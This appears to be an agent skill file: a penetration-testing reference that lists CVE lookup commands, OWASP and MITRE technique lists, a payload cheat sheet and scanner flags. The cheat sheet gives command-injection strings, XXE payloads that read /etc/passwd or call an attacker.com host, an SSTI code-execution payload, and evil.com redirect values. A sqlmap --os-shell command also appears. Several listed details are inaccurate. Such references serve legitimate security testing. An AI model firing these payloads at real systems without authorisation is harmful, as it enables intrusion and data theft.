---
name: knowledge-broker
description: Cyber Knowledge Broker — Unified surface for CVE/vulnerability intelligence, vulnerability methodology (OWASP/PTES/MITRE), tradecraft techniques, exploit signals, and tool documentation. Use when researching CVEs, looking up vulnerability intel, finding methodology guidance, learning tradecraft for specific attack classes, or checking installed tool versions and flags.
---

# CYBER KNOWLEDGE BROKER

**One surface for all security intelligence. Route every research question through this skill.**

---

## 1. VULNERABILITY INTELLIGENCE

### CVE Lookup

```bash
# Search by CVE ID
curl -s "https://cve.circl.lu/api/cve/CVE-2024-1234" | jq .

# NVD API (no key required, rate limited)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=apache+struts" | jq .

# CISA Known Exploited Vulnerabilities (KEV)
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | jq '.vulnerabilities[] | select(.cveID == "CVE-2024-1234")'

# Exploit-DB
searchsploit apache struts 2.5
searchsploit --cve 2024-1234
```

### Component Matching

When you observe a technology, check if it's vulnerable:

```
OBSERVED: nginx 1.18.0
→ Check: Known CVEs for nginx 1.18.0
→ Result: CVE-2021-23017 (DNS resolver off-by-one, Medium)
→ Applicability: Only if using DNS resolver feature
→ Action: Verify DNS resolver is enabled, test for heap overflow

OBSERVED: OpenSSH_8.2p1
→ Check: Known CVEs for OpenSSH 8.2p1
→ Result: CVE-2021-28041 (double-free, Medium — needs sshd configured for privilege separation)
→ Applicability: Low unless specific config
→ Action: Skip unless pentest requires SSH vuln assessment

OBSERVED: npm:lodash@4.17.20
→ Check: Known CVEs for lodash 4.17.20
→ Result: CVE-2021-23337 (command injection via template, High)
→ Applicability: HIGH — lodash is widely used
→ Action: Test if user input reaches lodash template function
```

### KEV/EPSS Enrichment

```
For any CVE, check:
1. CISA KEV (Known Exploited Vulnerabilities) — actively exploited in the wild
2. EPSS (Exploit Prediction Scoring System) — probability of exploitation in next 30 days
3. CVSS score — severity rating
4. NVD analysis — official assessment

KEV + High EPSS = MUST TEST
KEV + Low EPSS = Should test
No KEV + High EPSS = Should test
No KEV + Low EPSS = Nice to have
```

---

## 2. METHODOLOGY LOOKUP

### OWASP Web Security Testing Guide (WSTG)

```
WSTG-01: Information Gathering
  - WSTG-01-01: Test Role of HTTP Methods
  - WSTG-01-02: Fingerprint Web Application
  - WSTG-01-03: Review Webserver Metafiles
  - WSTG-01-04: Enumerate Applications on Webserver
  - WSTG-01-05: Review Page Content for Leaked Info
  - WSTG-01-06: Identify Entry Points
  - WSTG-01-07: Map Execution Paths Through App
  - WSTG-01-08: Fingerprint Platform

WSTG-02: Configuration and Deployment Management Testing
  - WSTG-02-01: Test Network Infrastructure Configuration
  - WSTG-02-02: Test Application Platform Configuration
  - WSTG-02-03: Test File Extensions for Sensitive Information
  - WSTG-02-04: Review Old Backup and Unreferenced Files
  - WSTG-02-05: Enumerate Infrastructure and Admin Interfaces
  - WSTG-02-06: Testing HTTP Methods
  - WSTG-02-07: Test HTTP Strict Transport Security
  - WSTG-02-08: Test RIAAM Policy Headers

WSTG-03: Identity Management Testing
  - WSTG-03-01: Test Role Definitions
  - WSTG-03-02: Test User Registration Process
  - WSTG-03-03: Test Account Provisioning Process
  - WSTG-03-04: Testing for Account Enumeration and Guessable User Accounts
  - WSTG-03-05: Testing for Weak or Unenforced Username Policy

WSTG-04: Authentication Testing
  - WSTG-04-01: Testing for Credentials Transported over an Encrypted Channel
  - WSTG-04-02: Testing for Default Credentials
  - WSTG-04-03: Testing for Weak Lock Out Mechanism
  - WSTG-04-04: Testing for Bypassing Authentication Schema
  - WSTG-04-05: Testing for Remember Me Token Schema
  - WSTG-04-06: Testing for Browser Cache Weaknesses
  - WSTG-04-07: Testing for Weak Password Policy
  - WSTG-04-08: Testing for Weak Security Question Recovery
  - WSTG-04-09: Testing for Weak Password Change Functionality
  - WSTG-04-10: Testing for Weaker Authentication in Alternative Channel

WSTG-05: Authorization Testing
  - WSTG-05-01: Testing Directory Traversal / File Include
  - WSTG-05-02: Testing for Bypassing Authorization Schema
  - WSTG-05-03: Testing for Privilege Escalation
  - WSTG-05-04: Testing for Insecure Direct Object References

WSTG-06: Session Management Testing
  - WSTG-06-01: Testing for Session Management Schema
  - WSTG-06-02: Testing for Cookie Attributes
  - WSTG-06-03: Testing for Session Fixation
  - WSTG-06-04: Testing for Exposed Session Variables
  - WSTG-06-05: Testing for Cross-Site Request Forgery
  - WSTG-06-06: Testing for Logout Functionality
  - WSTG-06-07: Testing Session Timeout
  - WSTG-06-08: Testing for Session Puzzling
  - WSTG-06-09: Testing for Session Hijacking

WSTG-07: Input Validation Testing
  - WSTG-07-01: Testing for Reflected Cross-Site Scripting
  - WSTG-07-02: Testing for Stored Cross-Site Scripting
  - WSTG-07-03: Testing for HTTP Verb Tampering
  - WSTG-07-04: Testing for HTTP Parameter Pollution
  - WSTG-07-05: Testing for SQL Injection
  - WSTG-07-06: Testing for LDAP Injection
  - WSTG-07-07: Testing for XML Injection
  - WSTG-07-08: Testing for SSI Injection
  - WSTG-07-09: Testing for XPath Injection
  - WSTG-07-10: Testing for IMAP SMTP Injection
  - WSTG-07-11: Testing for Code Injection
  - WSTG-07-12: Testing for OS Command Injection
  - WSTG-07-13: Testing for Format String Injection
  - WSTG-07-14: Testing for Incubated Vulnerabilities
  - WSTG-07-15: Testing for HTTP Incoming Requests
  - WSTG-07-16: Testing for Host Header Injection
  - WSTG-07-17: Testing for Server-Side Template Injection

WSTG-08: Error Handling
  - WSTG-08-01: Testing for Improper Error Handling
  - WSTG-08-02: Testing for Stack Traces

WSTG-09: Cryptography Testing
  - WSTG-09-01: Testing for Weak TLS/SSL Ciphers
  - WSTG-09-02: Testing for Padding Oracle
  - WSTG-09-03: Testing for Sensitive Information Sent via Unencrypted Channels
  - WSTG-09-04: Testing for Weak Encryption

WSTG-10: Business Logic Testing
  - WSTG-10-01: Test Business Logic Data Validation
  - WSTG-10-02: Test Ability to Forge Requests
  - WSTG-10-03: Test Integrity Checks
  - WSTG-10-04: Test for Process Timing
  - WSTG-10-05: Test Number of Times a Function Can Be Used
  - WSTG-10-06: Defense in Depth Test
  - WSTG-10-07: Test Upload of Unexpected File Types
  - WSTG-10-08: Test Upload of Malicious Files
```

### MITRE ATT&CK for Enterprise

```
RELEVANT MITRE TECHNIQUES FOR WEB PENTEST:

Initial Access:
  T1189: Drive-by Compromise
  T1190: Exploit Public-Facing Application
  T1199: Trusted Relationship
  T1133: External Remote Services

Execution:
  T1059: Command and Scripting Interpreter
  T1203: Exploitation for Client Execution

Persistence:
  T1098: Account Manipulation
  T1078: Valid Accounts

Privilege Escalation:
  T1068: Exploitation for Privilege Escalation
  T1078: Valid Accounts

Defense Evasion:
  T1027: Obfuscated Files or Information
  T1070: Indicator Removal

Credential Access:
  T1003: OS Credential Dumping
  T1110: Brute Force
  T1557: Adversary-in-the-Middle

Discovery:
  T1046: Network Service Scanning
  T1083: File and Directory Discovery

Lateral Movement:
  T1021: Remote Services
  T1550: Use Alternate Authentication Material

Collection:
  T1005: Data from Local System
  T1039: Data from Network Shared Drive

Exfiltration:
  T1041: Exfiltration Over C2 Channel
  T1567: Exfiltration Over Web Service

Impact:
  T1485: Data Destruction
  T1486: Data Encrypted for Impact
  T1489: Service Stop
```

---

## 3. TRADECRAFT LOOKUP

### By Attack Class

```
TRADECRAFT: IDOR
- Sequential IDs → change by ±1
- UUIDs → find from other endpoints (email invites, sharing links)
- Indirect references → change in POST body
- HTTP method confusion → test GET/PUT/POST/DELETE on same path
- GraphQL node IDs → decode base64, change, re-encode

TRADECRAFT: XSS
- Reflected → inject in URL params, check response
- Stored → inject in form, check when rendered
- DOM → check JS sources for sink functions (innerHTML, eval, document.write)
- Mutation XSS → test with <noscript>, <textarea>, <title> contexts
- CSP bypass → find open redirect, use as script source

TRADECRAFT: SQLi
- Error-based → inject quote, look for SQL errors
- Union-based → determine column count with ORDER BY
- Blind boolean → compare responses with true/false conditions
- Blind time → SLEEP/pg_sleep/WAITFOR DELAY
- Out-of-band → DNS/HTTP callback via LOAD_FILE or xp_cmdshell

TRADECRAFT: SSRF
- Direct URL parameter → inject internal IPs
- Cloud metadata → 169.254.169.254, metadata.google.internal
- IP bypass → decimal, octal, hex, IPv6, DNS rebinding
- Redirect chain → external URL 302s to internal
- File upload URL → import from internal URL

TRADECRAFT: AUTH BYPASS
- Missing auth → access endpoint without token
- Method confusion → GET protected, POST unprotected
- Path confusion → /admin vs /Admin vs /admin/ vs /./admin
- Parameter pollution → ?role=user&role=admin
- JWT none algorithm → remove signature, set alg to "none"
- JWT key confusion → use public key as HMAC secret

TRADECRAFT: COMMAND INJECTION
- Semicolon → ; whoami
- Pipe → | whoami
- Backticks → `whoami`
- Dollar parens → $(whoami)
- Logical operators → || whoami, && whoami
- Newline → %0a whoami
- Time-based → ; sleep 5

TRADECRAFT: XXE
- Basic → <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- Blind → <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
- Error-based → <!ENTITY xxe SYSTEM "file:///nonexistent">
- Parameter entity → <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;

TRADECRAFT: SSTI
- Jinja2/Twig → {{7*7}} → 49
- Freemarker → ${7*7} → 49
- ERB → <%= 7*7 %> → 49
-沙盒逃逸 → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

TRADECRAFT: OPEN REDIRECT
- Parameter manipulation → ?next=https://evil.com
- Double URL encoding → ?url=https%3A%2F%2Fevil.com
- Protocol confusion → //evil.com, /\evil.com
- Backslash → /target.com\@evil.com
- Tab/newline → /target.com%09.evil.com
```

---

## 4. TOOL DOCUMENTATION

### Tool Availability Matrix

```
TOOL            STATUS      PURPOSE                     INSTALL
═══════════════════════════════════════════════════════════════════════
subfinder       Required    Subdomain enumeration       go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
httpx           Required    HTTP probing                go install github.com/projectdiscovery/httpx/cmd/httpx@latest
nuclei          Required    Template-based scanning     go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nmap            Required    Port scanning               apt install nmap / brew install nmap
ffuf            Required    Directory fuzzing           go install github.com/ffuf/ffuf/v2@latest
sqlmap          Required    SQL injection testing       apt install sqlmap / brew install sqlmap
katana          Recommended Web crawling                go install github.com/projectdiscovery/katana/cmd/katana@latest
dnsx            Recommended DNS resolution              go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
naabu           Recommended Port scanning (fast)        go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
dalfox          Recommended XSS testing                 go install github.com/hahwul/dalfox/v2@latest
gobuster        Optional    Directory fuzzing           apt install gobuster
nikto           Optional    Web server scanning         apt install nikto
amass           Optional    Subdomain enumeration       apt install amass
```

### Tool Flag Reference

```bash
# subfinder — all flags
subfinder -d TARGET -all -o subs.txt -silent -timeout 30

# httpx — useful flags
httpx -l resolved.txt -sc -title -tech-detect -cdn -follow-redirects -o alive.txt -json

# nuclei — useful flags
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei.txt -json
nuclei -u TARGET -t ~/nuclei-templates/http/vulnerabilities/ -v

# nmap — useful flags
nmap -sV -sC -T4 -p- -oA nmap_full TARGET
nmap -sU -T4 --top-ports 100 -oA nmap_udp TARGET

# ffuf — useful flags
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -o fuzz.json
ffuf -u https://TARGET/FUZZ -w wordlist.txt -H "Authorization: Bearer TOKEN" -fc 403

# sqlmap — useful flags
sqlmap -u "https://TARGET/?id=1" --batch --dbs --threads 5
sqlmap -u "https://TARGET/?id=1" --batch --os-shell
```
